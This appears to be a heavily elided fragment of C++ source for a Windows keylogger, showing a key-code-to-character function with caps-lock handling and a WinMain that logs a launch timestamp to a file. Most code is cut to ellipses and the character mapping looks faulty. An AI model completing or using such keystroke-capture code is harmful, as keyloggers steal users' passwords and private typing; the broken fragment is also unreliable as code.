...
const char *const Version = "alpha 0.1.1.4";
...
string GetKey(int Key){
	...
	if(Key >=186 && Key <=222){
		...
		if (GetKeyState(VK_CAPITAL) && IS)
			KeyString = Key + 32;
		else if (!GetKeyState(VK_CAPITAL) && !IS)
			KeyString = Key + 32;
		else KeyString = Key;
	}else switch(Key){
		case VK_ESCAPE:
...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
	...
	file << endl << endl << "Launch: " << FormatTime() << endl;
